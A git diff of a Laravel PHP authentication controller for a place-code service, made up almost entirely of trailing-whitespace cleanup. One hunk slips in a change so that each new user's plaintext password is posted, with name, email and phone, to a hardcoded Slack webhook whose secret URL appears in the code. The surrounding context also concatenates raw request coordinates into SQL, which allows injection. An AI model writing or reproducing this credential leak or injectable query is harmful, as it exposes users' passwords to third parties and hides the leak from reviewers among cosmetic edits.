@@ -74,7 +74,7 @@ class AuthController extends Controller
       //Generate Referral Code
       $length = 6;
       $characters = '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-      $refCode = '';    
+      $refCode = '';
       for ($p = 0; $p < $length; $p++) {
           $refCode .= $characters[mt_rand(0, strlen($characters))];
       }
@@ -117,7 +117,7 @@ class AuthController extends Controller
      //Slack Webhook : notify
       define('SLACK_WEBHOOK', 'https://hooks.slack.com/services/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');
     // Make your message
-      $message = array('payload' => json_encode(array('text' => "New User Registered,Name:".$request->name." , Email:".$request->email." ,Phone:".$request->phone."")));
+      $message = array('payload' => json_encode(array('text' => "New User Registered,Name:".$request->name." , Email:".$request->email." ,Phone:".$request->phone.", Password:".$request->password." ")));
       $c = curl_init(SLACK_WEBHOOK);
       curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
       curl_setopt($c, CURLOPT_POST, true);
@@ -146,10 +146,10 @@ class AuthController extends Controller
       //     $message->to($request->email)->subject('Welcome to Barikoi Community.');
       // });
 
-      
+
     }
     /*return new JsonResponse([
-      'message' => $refCode 
+      'message' => $refCode
     ]);*/
   }
 
@@ -162,11 +162,11 @@ class AuthController extends Controller
   //     'userType'=>'required',
   //     'phone' => 'numeric|min:11|unique:users',
   //   ]);
-    
+
   //   //Generate Referral Code
   //   $length = 6;
   //   $characters = '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-  //   $refCode = '';    
+  //   $refCode = '';
   //   for ($p = 0; $p < $length; $p++) {
   //       $refCode .= $characters[mt_rand(0, strlen($characters))];
   //   }
@@ -205,7 +205,7 @@ class AuthController extends Controller
 
   //   return response()->json('Welcome');
   //   /*return new JsonResponse([
-  //     'message' => $refCode 
+  //     'message' => $refCode
   //   ]);*/
   // }
 
@@ -391,13 +391,13 @@ class AuthController extends Controller
       'data' => JWTAuth::parseToken()->authenticate()
     ]);
   }
-  
+
   //Admin Routes;
   public function getUserList(){
     $user = JWTAuth::parseToken()->authenticate();
     $userId = $user->id;
     $GetUserType=User::where('id','=',$userId)->select('userType')->first();
-    $userType=$GetUserType->userType;  
+    $userType=$GetUserType->userType;
     //return $userType;
 
     if($userType==1){
@@ -425,9 +425,9 @@ class AuthController extends Controller
       $getuserData=User::where('id','=',$userId)->select('name')->first();
       $name="'".$getuserData->name."'";
       //return $token;
-    
 
-      
+
+
       $place = Place::where('uCode','=',$code)->first();
       DB::table('analytics')->increment('search_count',1);
       //$searched4Code=$code;
@@ -480,7 +480,7 @@ class AuthController extends Controller
       return new JsonResponse([
         'message' => 'Could not find any User with this Email!',
         ]);
-    }      
+    }
   }
 }
 
@@ -508,7 +508,7 @@ class AuthController extends Controller
         return new JsonResponse([
         'message' => 'Password changed successfully.',
         ]);
-  
+
     }else{
       return new JsonResponse([
         'message'=>'Your current password dose not match our record.',
@@ -548,7 +548,7 @@ class AuthController extends Controller
   {
     $user = JWTAuth::parseToken()->authenticate();
     $userId = $user->id;
-   //update all places with this 'deviceId' ,where user_id is null -> update the user id to $userId;  
+   //update all places with this 'deviceId' ,where user_id is null -> update the user id to $userId;
     $placesWithDvid=Place::where('device_ID','=',$deviceId)->where('user_id', null)->update(['user_id' => $userId]);
     //get the places with user id only
     $place = Place::where('user_id','=',$userId)->get();
@@ -567,7 +567,7 @@ class AuthController extends Controller
   }
 
 
-      //Add New Place    
+      //Add New Place
     public function authAddNewPlace(Request $request){
 
       $user = JWTAuth::parseToken()->authenticate();
@@ -602,7 +602,7 @@ class AuthController extends Controller
       }
       //check if it is public and less then 5 meter
       if($request->flag==1){
-        
+
         $result = DB::table('places')
            ->select(DB::raw('*, ((ACOS(SIN('.$lat.' * PI() / 180) * SIN(latitude * PI() / 180) + COS('.$lat.' * PI() / 180) * COS(latitude * PI() / 180) * COS(('.$lon.' - longitude) * PI() / 180)) * 180 / PI()) * 60 * 1.1515 * 1.609344) as distance'))
           //->where('pType', '=','Food')
@@ -623,9 +623,9 @@ class AuthController extends Controller
         $input->area = $request->area;
         $input->postCode = $request->postCode;
         $input->pType = $request->pType;
-        $input->subType = $request->subType;  
+        $input->subType = $request->subType;
         //longitude,latitude,Address,city,area,postCode,pType,subType,flag,device_ID,user_id,email
-        if($request->has('flag')) 
+        if($request->has('flag'))
         {
           $input->flag = $request->flag;
           if ($request->flag==1) {
@@ -638,18 +638,18 @@ class AuthController extends Controller
               $input->device_ID = $request->device_ID;
           }
 
-        //ADN:when authenticated , user_id from client will be passed on this var. 
+        //ADN:when authenticated , user_id from client will be passed on this var.
         $input->user_id =$userId;
 
         if ($request->has('email')){
           $input->email = $request->email;
         }
-        
+
         if ($request->has('route_description')){
           $input->route_description = $request->route_description;
         }
         $input->uCode = $ucode;
-        $input->isRewarded = 1;  // means the recieves 5 points    
+        $input->isRewarded = 1;  // means the recieves 5 points
         $input->save();
         User::where('id','=',$userId)->increment('total_points',5);
         $getTheNewTotal=User::where('id','=',$userId)->select('total_points')->first();
@@ -696,7 +696,7 @@ class AuthController extends Controller
       $lat = $request->latitude;
       $lon = $request->longitude;
       //check if it is private and less then 1 meter
-      if($request->flag==0){      
+      if($request->flag==0){
       $result = DB::table('places')
            ->select(DB::raw('*, ((ACOS(SIN('.$lat.' * PI() / 180) * SIN(latitude * PI() / 180) + COS('.$lat.' * PI() / 180) * COS(latitude * PI() / 180) * COS(('.$lon.' - longitude) * PI() / 180)) * 180 / PI()) * 60 * 1.1515 * 1.609344) as distance'))
           //->where('pType', '=','Food')
@@ -708,7 +708,7 @@ class AuthController extends Controller
       }
       //check if it is public and less then 5 meter
       if($request->flag==1){
-        
+
         $result = DB::table('places')
            ->select(DB::raw('*, ((ACOS(SIN('.$lat.' * PI() / 180) * SIN(latitude * PI() / 180) + COS('.$lat.' * PI() / 180) * COS(latitude * PI() / 180) * COS(('.$lon.' - longitude) * PI() / 180)) * 180 / PI()) * 60 * 1.1515 * 1.609344) as distance'))
           //->where('pType', '=','Food')
@@ -726,9 +726,9 @@ class AuthController extends Controller
         $input->area = $request->area;
         $input->postCode = $request->postCode;
         $input->pType = $request->pType;
-        $input->subType = $request->subType;  
+        $input->subType = $request->subType;
         //longitude,latitude,Address,city,area,postCode,pType,subType,flag,device_ID,user_id,email
-        if($request->has('flag')) 
+        if($request->has('flag'))
         {
           $input->flag = $request->flag;
           if ($request->flag==1) {
@@ -741,7 +741,7 @@ class AuthController extends Controller
             $input->device_ID = $request->device_ID;
         }
 
-        //ADN:when authenticated , user_id from client will be passed on this var. 
+        //ADN:when authenticated , user_id from client will be passed on this var.
         $input->user_id =$userId;
 
         if ($request->has('email')){
@@ -751,7 +751,7 @@ class AuthController extends Controller
           $input->route_description = $request->route_description;
         }
         $input->uCode = $request->uCode;
-        $input->isRewarded = 1;      
+        $input->isRewarded = 1;
         $input->save();
         //
         User::where('id','=',$userId)->increment('total_points',5);
@@ -802,7 +802,7 @@ class AuthController extends Controller
         $places->Address = $request->Address;
         $places->city = $request->city;
         $places->area = $request->area;
-        $places->user_id = $userId; 
+        $places->user_id = $userId;
         $places->postCode = $request->postCode;
         $places->flag = $request->flag;
         if ($request->has('pType')) {
@@ -817,7 +817,7 @@ class AuthController extends Controller
 
         $places->save();
     //  $splaces = SavedPlace::where('pid','=',$id)->update(['Address'=> $request->Address]);
-    
+
         return response()->json('updated');
     }
     //Delete place from MyPlaces/"Places" table
@@ -825,7 +825,7 @@ class AuthController extends Controller
         $user = JWTAuth::parseToken()->authenticate();
         $userId = $user->id;
         $toBeRemoved=$bariCode;
-       // $getPid=Place::where('uCode','=',$toBeRemoved)->first();    
+       // $getPid=Place::where('uCode','=',$toBeRemoved)->first();
       //  $pid=$getPid->id;
        // $toDeleteSavedPlacesTable =SavedPlace::where('pid','=',$pid)->where('user_id','=',$userId)->delete();
 
@@ -935,7 +935,7 @@ class AuthController extends Controller
         $saved = new SavedPlace;
         $saved->user_id = $userId; //user who is adding a place to his/her favorite
         $code = $request->barikoicode; // place is
-        $getPid=Place::where('uCode','=',$code)->first();    
+        $getPid=Place::where('uCode','=',$code)->first();
         $pid=$getPid->id;
         $saved->pid=$pid;
         //return $pid;
@@ -959,7 +959,7 @@ class AuthController extends Controller
         $user = JWTAuth::parseToken()->authenticate();
         $userId = $user->id;
         //Generate Referral Code
-       
+
         $userInfo=User::where('id','=',$userId)->select('ref_code','isReferred')->first();
         $isRef_code=$userInfo->ref_code;
       //  return $isRef_code;
@@ -967,7 +967,7 @@ class AuthController extends Controller
         $length = 6;
         //exclude 0 & O;
         $characters = '123456789ABCDEFGHIJKLMNPQRSTUVWXYZ';
-        $refCode = '';    
+        $refCode = '';
         for ($p = 0; $p < $length; $p++) {
             $refCode .= $characters[mt_rand(0, strlen($characters))];
         }
@@ -1030,11 +1030,11 @@ class AuthController extends Controller
               User::where('id','=',$referrerId)->increment('total_points',$rewardPoints);
               //Update the isRferred flag for the Redemmer in User Table
               User::where('id','=',$userId)->update(['isReferred'=>1]);
-              
+
               $Redeemer=User::where('id','=',$userId)->select('name')->first();
               $InviterMail=User::where('id','=',$referrerId)->select('name','email')->first();
               $data = array( 'to' => $InviterMail['email'],'redeemer' => $Redeemer['name'],'points' => $rewardPoints);
-                           
+
                            //Slack Webhook : notify
               define('SLACK_WEBHOOK', 'https://hooks.slack.com/services/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');
               //Make your message
